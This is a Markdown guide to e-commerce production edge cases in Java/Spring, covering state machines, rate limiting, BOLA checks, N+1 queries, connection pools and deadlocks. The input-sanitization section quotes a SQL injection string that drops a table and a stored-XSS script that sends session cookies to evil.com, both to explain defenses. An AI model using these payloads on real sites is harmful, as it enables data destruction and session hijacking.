# E-commerce Production Edge Cases
### Senior-Level Code Review: Problem → Solution → Trade-offs → Why This Way

> 30 edge cases. Each one has caused a real production incident somewhere.
> Written the way a senior engineer explains a PR review — not just "what" but "why this approach
> over the alternatives," and what you give up when you choose it.

---

## Original 20 Cases (Quick Reference)

| # | Case | Key Mechanism |
|---|------|---------------|
| 5 | Reservation TTL | Scheduled expiry job |
| 6 | Soft Delete | `is_active` flag |
| 7 | Concurrent Cart Lock | `SELECT FOR UPDATE` |
| 8 | Order State Machine | Enum + `validateTransitionTo()` |
| 9 | Duplicate Payment | DB `UNIQUE(order_id)` |
| 10 | Refund State Machine | State-based idempotency |
| 11 | Outbox Pattern | Same-TX event + background poller |
| 12 | Rate Limiting | AOP fixed-window |
| 13 | Read-after-Write | `@Transactional(readOnly=true)` |
| 14 | Atomic SQL Decrement | `UPDATE WHERE qty >= N` |
| 15 | JWT Token Version | `token_version` column |
| 16 | Address Ownership | Service-layer BOLA check |
| 17 | Checkout Atomicity | Single `@Transactional` |
| 18 | Notification Dedup | App check + DB UNIQUE |
| 19 | Graceful Shutdown | `server.shutdown: graceful` |
| 20 | Input Sanitization | Parameterized queries + Bean Validation |

> The full explanations with execution flows for cases 1–20 are directly below.

---

## Cases #1–#20 — Full Execution Flows


## Edge Case #8 — Order State Machine (Invalid Status Transitions)

### The Problem
An order goes through: `PENDING → CONFIRMED → SHIPPED → DELIVERED`.
Without enforcement, a bug in a payment webhook could directly set a `DELIVERED` order back
to `PENDING`. A refund handler could trigger on a `CANCELLED` order. Support tools could
accidentally cancel a `DELIVERED` order.

Invalid transitions don't just corrupt data — they trigger cascading side effects
(re-issuing notifications, incorrect inventory adjustments, wrong financial entries).

### Execution Flow

```
[Valid transition]
PENDING ──► CONFIRMED ──► SHIPPED ──► DELIVERED
                                          │
                                     COMPLETED or
                                     REFUND_REQUESTED

[Invalid transition — BLOCKED]
DELIVERED ──X──► PENDING
                 "Cannot transition from DELIVERED to PENDING"
```

### The Solution
```java
public enum OrderStatus {
    PENDING, CONFIRMED, SHIPPED, DELIVERED, COMPLETED,
    CANCELLED, REFUND_REQUESTED, REFUNDED;

    private static final Map<OrderStatus, Set<OrderStatus>> VALID_TRANSITIONS = Map.ofEntries(
        Map.entry(PENDING,           Set.of(CONFIRMED, CANCELLED)),
        Map.entry(CONFIRMED,         Set.of(SHIPPED, CANCELLED)),
        Map.entry(SHIPPED,           Set.of(DELIVERED)),
        Map.entry(DELIVERED,         Set.of(COMPLETED, REFUND_REQUESTED)),
        Map.entry(REFUND_REQUESTED,  Set.of(REFUNDED, CONFIRMED)),
        Map.entry(COMPLETED,         Set.of()),
        Map.entry(CANCELLED,         Set.of()),
        Map.entry(REFUNDED,          Set.of())
    );

    public void validateTransitionTo(OrderStatus next) {
        if (!VALID_TRANSITIONS.get(this).contains(next)) {
            throw new InvalidOrderTransitionException(this, next);
        }
    }
}

// Usage in service:
order.getStatus().validateTransitionTo(newStatus);  // throws if invalid
order.setStatus(newStatus);
```

**Trade-off:** Every new business requirement (e.g., "allow re-opening a COMPLETED order")
requires adding a new valid transition. This is a **feature**, not a bug — it forces
explicit business approval before a new path is allowed.

---

---

## Edge Case #10 — Refund State Machine (Concurrent Refund Prevention)

### The Problem
A customer submits a refund request. Their support agent also initiates a refund from the
admin panel simultaneously. Two concurrent refund requests reach the service. Without
protection, both pass the `status = DELIVERED` check and two refunds are issued —
**double refund to the customer, double loss to the business**.

### Execution Flow

```
State Machine:
  DELIVERED ──► REFUND_REQUESTED ──► REFUNDED
                     │
                     └──► REFUND_FAILED (→ human review)

Concurrent requests:
  Thread A                         DB                     Thread B
  │                                 │                          │
  ├─ SELECT FOR UPDATE order ──────►│                          │
  │  (lock acquired)                │                          │
  │                                 │  Thread B blocks at      │
  │                                 │  SELECT FOR UPDATE ───────►│
  ├─ status = DELIVERED ✓           │                          │
  ├─ UPDATE status=REFUND_REQUESTED►│                          │
  ├─ call gateway.refund()          │                          │
  ├─ UPDATE status=REFUNDED ───────►│                          │
  ├─ COMMIT ───────────────────────►│                          │
  │                                 │  Thread B acquires lock ─►│
  │                                 │  status = REFUNDED ≠ DELIVERED
  │                                 │  → throws InvalidTransition │
  │                                 │  → 409 Conflict ◄──────────┤
```

### The Solution
```java
// State machine prevents the transition:
// REFUNDED.validateTransitionTo(REFUND_REQUESTED) → throws InvalidOrderTransitionException

// Pessimistic lock prevents the race:
OrderEntity order = orderRepo.findByIdForUpdate(orderId);
order.getStatus().validateTransitionTo(OrderStatus.REFUND_REQUESTED);
// From this point, only one thread processes the refund
```

**Trade-off:** `REFUND_FAILED` is a terminal state requiring human review — the system
cannot automatically retry a failed refund (the gateway might have partially processed it).
An alert fires when any order reaches `REFUND_FAILED`; ops investigates and re-triggers manually.

---


## Edge Case #12 — Rate Limiting (Preventing Abuse)

### The Problem
A malicious bot (or a poorly-written third-party integration) hammers your product search
endpoint 10,000 times per minute. Without rate limiting:
- DB connection pool exhausted → all users get errors
- Search indexes thrashed → degraded performance for everyone
- Competitor scraping your entire product catalog

### Execution Flow

```
Client                          AOP RateLimitAspect              DB
  │                               │                               │
  ├─ GET /products/search ────────►│                               │
  │  [1st request]                ├─ check counter for IP/user   │
  │                               │  counter = 0 → allow         │
  │                               │  counter++ (counter=1)       │
  │◄─ 200 OK ─────────────────────┤                               │
  │                               │                               │
  ├─ GET /products/search ─ (×98)─►│                               │
  │  [requests 2–99]              │  counter = 98 → allow        │
  │                               │  counter++ each time         │
  │◄─ 200 OK ─────────────────────┤                               │
  │                               │                               │
  ├─ GET /products/search ────────►│                               │
  │  [100th request in 1 minute]  ├─ counter = 99 → ALLOW        │
  │                               │  counter++ (counter=100)     │
  │◄─ 200 OK ─────────────────────┤                               │
  │                               │                               │
  ├─ GET /products/search ────────►│                               │
  │  [101st request in 1 minute]  ├─ counter = 100 → REJECT      │
  │◄─ 429 Too Many Requests ──────┤                               │
  │   Retry-After: 47s            │                               │
```

### The Solution
```java
@Aspect
@Component
public class RateLimitAspect {
    private final Map<String, RateLimitEntry> store = new ConcurrentHashMap<>();

    @Around("@annotation(rateLimited)")
    public Object enforce(ProceedingJoinPoint pjp, RateLimited rateLimited) {
        String key = buildKey(request);  // userId or IP
        RateLimitEntry entry = store.computeIfAbsent(key, k -> new RateLimitEntry());
        
        if (entry.isExceeded(rateLimited.maxRequests(), rateLimited.windowSeconds())) {
            throw new RateLimitExceededException(entry.getRetryAfterSeconds());
        }
        
        return pjp.proceed();
    }
}
```

**Usage:**
```java
@GetMapping("/products/search")
@RateLimited(maxRequests = 100, windowSeconds = 60)
public Page<ProductResponse> search(...) { ... }
```

**Trade-off:** This is an in-memory, single-JVM implementation. With 3 app servers, a user
gets 100 requests per server = 300 per minute across the cluster. For production multi-instance
setups, replace the `ConcurrentHashMap` with a Redis counter (`INCR` + `EXPIRE`).

---

## Edge Case #13 — Read-After-Write Consistency

### The Problem
User updates their shipping address. The app saves the update (write goes to primary DB),
then immediately fetches their profile to show a confirmation page. With read replicas,
the fetch goes to a replica that hasn't received the replication yet — **the user sees
their OLD address on the confirmation page**, thinking the update didn't save.

This erodes user trust. The user re-submits → creates duplicate update → potentially
checkout goes to the wrong old address.

### Execution Flow

```
Without fix:
  User                  App                  Primary DB       Replica DB
    │  PUT /profile ─────►│                       │                │
    │                     ├─── UPDATE ────────────►│                │
    │                     │◄─── OK ───────────────┤                │
    │  GET /profile ──────►│                       │   [replication lag ~100ms]
    │                     ├─── SELECT ─────────────────────────────►│
    │                     │◄─── OLD DATA ──────────────────────────┤
    │◄── Shows old address ┤                       │                │
    │                     │                       │                │
With fix (sticky read):
    │  PUT /profile ─────►│                       │                │
    │                     ├─── UPDATE ────────────►│                │
    │  GET /profile ──────►│  [same request context]               │
    │                     ├─── SELECT ────────────►│  (reads from primary)
    │                     │◄─── NEW DATA ──────────┤                │
    │◄── Shows new address ┤                       │                │
```

### The Solution
```java
// Mark write operations — subsequent reads in the same request go to primary
@Transactional  // read-write → connects to primary
public UserProfile updateProfile(UUID userId, UpdateProfileRequest req) {
    UserProfile profile = userRepo.findById(userId).orElseThrow();
    profile.update(req);
    return userRepo.save(profile);
}

// For pure reads, explicitly route to replica:
@Transactional(readOnly = true)  // → can route to replica
public UserProfile getProfile(UUID userId) {
    return userRepo.findById(userId).orElseThrow();
}
```

In the controller, `updateProfile` returns the saved entity directly — no second fetch needed.

**Trade-off:** `@Transactional(readOnly=true)` is a hint to the routing infrastructure.
Without a read/write routing data source (like Spring's `AbstractRoutingDataSource`), this
only helps Hibernate optimize (no flush, no dirty checking). For full read-replica routing,
configure a `ReadWriteRoutingDataSource`.

---

## Edge Case #16 — Address Ownership (BOLA — Broken Object Level Authorization)

### The Problem
BOLA (Broken Object Level Authorization — OWASP API Top 10 #1) is the most exploited
API vulnerability. The attack:

```
User Alice (id=1) has address id=5
User Bob (id=2) makes request:
  DELETE /users/1/addresses/5
  Authorization: Bearer <bob's token>
```

If the service only checks "is the user authenticated?" without checking "does this user
OWN address 5?", Bob can delete Alice's address. Or worse, read Alice's shipping history.

### Execution Flow

```
Bob                             App                              DB
  │                               │                               │
  ├─ DELETE /addresses/5 ─────────►│                               │
  │  (Bob's JWT: userId=2)        │                               │
  │                               ├─ findById(5) ────────────────►│
  │                               │◄─ address {id=5, userId=1} ───┤
  │                               │                               │
  │                               │  address.userId (1) ≠         │
  │                               │  jwtUserId (2)                │
  │                               │  → throw ForbiddenException   │
  │◄─ 403 Forbidden ──────────────┤                               │
  │  "You don't own this resource"│                               │
```

### The Solution
```java
public void deleteAddress(UUID requestingUserId, UUID addressId) {
    AddressEntity address = addressRepo.findById(addressId)
        .orElseThrow(() -> new ResourceNotFoundException("Address", addressId));
    
    // BOLA check — must happen EVERY time, in the service layer
    if (!address.getUserId().equals(requestingUserId)) {
        // Return 403 (not 404) so the requester knows they're unauthorized
        throw new ForbiddenException("Access denied to address " + addressId);
    }
    
    addressRepo.delete(address);
}
```

**Why 403 and not 404?** Debate is ongoing in the security community. Returning 404
("resource not found") leaks no information about existence, which is slightly more
secure. But 403 gives a clearer signal to legitimate users ("wrong account") vs.
bots (who can enumerate both anyway). Our choice: 403 for better developer UX.

**Trade-off:** Every new endpoint that operates on user-owned resources must add this check.
It's easy to forget. Solution: a `@OwnershipRequired` AOP annotation that
automatically performs the check, removing the manual burden from each service method.

---

## Edge Case #20 — Input Sanitization (SQL Injection + XSS Prevention)

### The Problem
Unsanitized user input is the #1 cause of web application vulnerabilities (OWASP):

**SQL Injection:**
```
Product search: ?q=laptop'; DROP TABLE products; --
Naive query:    "SELECT * FROM products WHERE name = 'laptop'; DROP TABLE products; --'"
Result:         products table deleted
```

**Cross-Site Scripting (XSS):**
```
Product review: "<script>document.location='https://evil.com?cookie='+document.cookie</script>"
If stored and rendered unescaped: steals every user's session cookie who views the review
```

### Execution Flow

```
Attacker                        App                              DB
  │                               │                               │
  ├─ POST /reviews ───────────────►│                               │
  │  {content: "<script>steal()"}  │                               │
  │                               ├─ @Valid validates fields      │
  │                               ├─ @Size(max=2000) ✓            │
  │                               ├─ sanitize HTML entities:      │
  │                               │  "<" → "&lt;"                 │
  │                               │  ">" → "&gt;"                 │
  │                               ├─ INSERT INTO reviews ─────────►│
  │                               │  (parameterized query) ✓     │
  │                               │  content = "&lt;script&gt;..." │
  │                               │                               │
  │  [Victim views review page]   │                               │
  │                               │  Renders: <script>steal()    │
  │                               │  as literal text — harmless ✓ │
```

### The Solution — Four Layers

**Layer 1 — Parameterized queries (Spring Data JPA default):**
```java
// WRONG (string concatenation):
String sql = "SELECT * FROM products WHERE name = '" + userInput + "'";

// RIGHT (parameterized — Spring Data JPA default):
productRepo.findByName(userInput);
// → Hibernate: SELECT * FROM products WHERE name = ?  [userInput bound separately]
```
The `?` placeholder tells the DB driver: "this is data, never code." SQL injection is
structurally impossible.

**Layer 2 — Bean Validation (`@Valid`):**
```java
public record SearchRequest(
    @NotBlank @Size(max = 200) String query,
    @Min(0) @Max(10000) BigDecimal maxPrice
) {}
```

**Layer 3 — HTML sanitization for stored content (reviews, descriptions):**
```java
// Using OWASP Java HTML Sanitizer or Jsoup:
String safeContent = Jsoup.clean(userInput, Safelist.basic());
```

**Layer 4 — Security headers (HTTP response headers):**
```
Content-Security-Policy: default-src 'self'   ← blocks external script loading
X-Content-Type-Options: nosniff               ← prevents MIME sniffing attacks
X-Frame-Options: DENY                         ← blocks clickjacking
```

**Trade-off:** Validation adds latency (microseconds — negligible). HTML sanitization
may strip legitimate formatting (e.g., markdown in product descriptions). Solution:
use a whitelist-based sanitizer (`Safelist.basic()`) that allows harmless tags (`<b>`, `<i>`,
`<a href>`) while blocking all script-related elements.

---

## New Cases #21–#30 (Senior / Principal Level)

---


## Edge Case #23 — N+1 Query Problem

### The Problem
The most common performance killer that looks fine in development and breaks in production.

```java
// LOOKS INNOCENT:
List<Order> orders = orderRepo.findByUserId(userId);  // 1 query: SELECT * FROM orders
for (Order o : orders) {
    o.getItems();  // LAZY LOAD: 1 query per order → N queries
}
// With 20 orders: 1 + 20 = 21 queries per request
// With 100 concurrent users: 2100 queries/second
// Database CPU: 100%
```

This never shows up in unit tests (mocked repos) or development (tiny datasets).
It destroys production systems at scale.

### Our Solution — Two-Query Pagination Pattern

**Naive JOIN FETCH with pagination (WRONG):**
```java
// THIS TRIGGERS HHH90003004 WARNING:
@Query("SELECT DISTINCT o FROM OrderEntity o LEFT JOIN FETCH o.items WHERE o.userId = :uid")
Page<OrderEntity> findWithItems(UUID uid, Pageable pageable);
```
Hibernate cannot apply SQL LIMIT with JOIN FETCH — it fetches ALL rows in memory, then paginates in Java.
With 10,000 orders, this loads all 10,000 into memory for every page request.

**Correct: Two-query pattern:**
```java
// Query 1: paginated IDs only (fast, no join, DB-level LIMIT)
Page<UUID> ids = orderRepo.findOrderIdsByUserId(userId, pageable);

// Query 2: full objects with items for ONLY the current page (no pagination needed)
List<OrderEntity> orders = orderRepo.findByIdsWithItems(ids.getContent());
```
Total: 2 queries regardless of total order count. Memory: only current page in memory.

### Why This Approach?

**Alternative: Use DTOs with @NamedEntityGraph**
> "Declare an entity graph to specify what to eagerly load."

✅ **Also valid.** Entity graphs are more declarative. But they're verbose and can be hard
to compose for complex cases. The two-query pattern is explicit, easy to understand, and more
flexible for varying load requirements per endpoint.

**Alternative: Make items EAGER fetch always**
> "Just add `fetch = FetchType.EAGER` on the items collection."

❌ **NEVER.** Eager fetch on collections runs the N+1 problem automatically on every load of
the parent entity — even when you don't need the items. You've made N+1 permanent and hidden.

**Alternative: Use `@BatchSize(size = 20)` on the collection**
> "Hibernate batches lazy loads: 20 at a time instead of 1 at a time."

✅ **Simple fix that helps.** Instead of N queries, you get ceil(N/20) queries.
Still N+1 in nature but much less damaging. Good as a fallback safety net (`@BatchSize`
on the entity class or collection globally).

**Trade-off: Two-query loses total count for pagination**
The first query returns a `Page<UUID>` which includes total count (for "Page X of Y" UI).
The second query returns a list. You reconstruct the page manually. Slightly more code,
but correctness and performance are non-negotiable.

**Code:** [`OrderRepository.findOrderIdsByUserId() + findByIdsWithItems()`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/order/repository/OrderRepository.java)

---

## Edge Case #24 — Database Connection Pool Exhaustion

### The Problem
`HikariPool-1 - Connection is not available, request timed out after 30000ms.`

This error means ALL database connections are in use. Every new request waits in a queue.
After 30 seconds, it gives up → the user gets a 500 error.

**Root causes (in order of frequency):**
1. **Long-running transactions** holding connections while waiting for external calls
   (e.g., a payment gateway call INSIDE a `@Transactional` method)
2. **Slow queries** without indexes (a full table scan on 1M rows holds a connection for seconds)
3. **Connection leaks** — code that opens connections and never closes them
4. **Pool sized too small** for the actual workload

**Why it cascades:**
One slow request holds a connection → queue fills → all requests wait → more connections needed
→ all exhausted → all requests time out → retries start → even more load → **complete outage**

### Our Solution — Four Defenses

**Defense 1 — Tight connection timeout (fail fast):**
```yaml
hikari:
  connection-timeout: 3000  # 3 seconds, not 30
```
When the pool is exhausted, fail fast. The user gets an error in 3 seconds, not 30.
A fast 503 is better than a frozen browser. Also limits cascading load from hung requests.

**Defense 2 — Leak detection threshold:**
```yaml
hikari:
  leak-detection-threshold: 10000  # warn if held > 10 seconds
```
Logs a stack trace showing WHERE the connection was acquired. Finds leaks immediately.

**Defense 3 — `@Transactional(timeout=10)` on slow operations:**
```java
@Transactional(timeout = 10)  // release connection if stuck > 10 seconds
public CheckoutResponse checkout(...) { ... }
```
If the checkout takes > 10 seconds (e.g., DB lock wait), Spring rolls back and throws.
The connection is released. The user gets a clean error. Other users are unaffected.

**Defense 4 — Never make external HTTP calls inside a transaction:**
```java
// WRONG:
@Transactional
public void processPayment() {
    saveOrder();          // holds DB connection...
    paymentGateway.charge();  // ...while making HTTP call to external service (may take seconds)
    savePaymentResult();
}

// RIGHT: Commit DB changes first, THEN call external service
public void processPayment() {
    saveOrderInItsOwnTransaction();   // connection released after commit
    paymentGateway.charge();          // external call with no connection held
    savePaymentResultInNewTransaction();
}
```

### Why This Approach?

**Alternative: Just increase pool size**
> "Set `maximum-pool-size: 200` and the problem goes away."

❌ **Treats the symptom, not the cause.** And creates new problems: PostgreSQL has a default
`max_connections=100`. Exceeding it crashes the DB. More connections also mean more memory and
more lock contention. The right pool size is small (10-30) with fast transactions.

**Alternative: Connection per request (old servlet model)**
❌ **What we had before connection pools.** 1000 concurrent users = 1000 DB connections. Each
PostgreSQL connection uses ~5MB RAM → 5GB for connection management alone. Unusable.

**Trade-off: Tight timeout rejects legitimate slow operations**
A 10-second timeout will occasionally reject valid requests that happen to be slow (DB under load
during a sale). Mitigation: monitor P99 latency; set timeout to 3-5× the P99.

**Code:** [`application.yml hikari config`](../ecommerce-monolith/src/main/resources/application.yml)

---

## Edge Case #25 — Database Deadlock Detection and Consistent Lock Ordering

### The Problem
```
T1: SELECT ... FOR UPDATE WHERE product_id = 'A'  ← locks A
T2: SELECT ... FOR UPDATE WHERE product_id = 'B'  ← locks B
T1: SELECT ... FOR UPDATE WHERE product_id = 'B'  ← waits (T2 has B)
T2: SELECT ... FOR UPDATE WHERE product_id = 'A'  ← waits (T1 has A)
DEADLOCK. PostgreSQL kills T2. T2 gets: ERROR 40P01: deadlock detected.
```

In e-commerce: User X orders [Product-A, Product-B]. User Y orders [Product-B, Product-A].
If inventory is reserved in arbitrary order, this deadlock happens regularly under concurrent load.

### Our Solution — Two Complementary Fixes

**Fix 1 — Consistent Lock Ordering (prevents deadlocks):**
Always sort products by UUID before acquiring locks:
```java
List<OrderItemEntity> items = order.getItems().stream()
    .sorted(Comparator.comparing(i -> i.getProductId().toString()))
    .toList();
// Now both T1 and T2 always lock A first, then B → no circular dependency
```
If T1 and T2 both lock A first, T2 waits at A while T1 completes both locks and commits.
No cycle → no deadlock.

**Fix 2 — `DeadlockRetryTemplate` (catches residual deadlocks):**
Even with lock ordering, deadlocks can occur from index locks, constraint checks, and
PostgreSQL's internal page-level locking. Always have a retry layer:
```java
return DeadlockRetryTemplate.execute("checkout", () -> checkoutService.performCheckout(userId, req));
```
The template catches `CannotAcquireLockException` / `DeadlockLoserDataAccessException`
(Spring's wrappers for PostgreSQL `40P01`) and retries with jittered exponential backoff.

### Why This Approach?

**Alternative: `SERIALIZABLE` transaction isolation**
> "Use the highest isolation level — PostgreSQL handles deadlocks automatically."

❌ **Massive performance cost.** SERIALIZABLE adds significant overhead and causes many more
transaction aborts (serialization failures). Under high concurrency, 30-50% of transactions
may abort and retry. Acceptable for financial audits; catastrophic for e-commerce checkout.
`READ COMMITTED` + explicit `FOR UPDATE` gives us the same correctness with much better throughput.

**Alternative: Application-level locking (Redis)**
> "Acquire a Redis lock on `inventory:{productId}` before each reservation."

✅ **Avoids DB deadlocks entirely.** But: Redis lock expiry creates new edge cases (what if
the lock expires mid-reservation?). DB-level locking is simpler and automatically released
on transaction commit/rollback.

**Trade-off: Retry adds latency**
A deadlock victim must retry the entire transaction. Under load, this adds 30–300ms per retried
request. This is acceptable — deadlocks are rare under correct lock ordering.

**Code:** [`DeadlockRetryTemplate.java`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/infrastructure/resilience/DeadlockRetryTemplate.java)

---
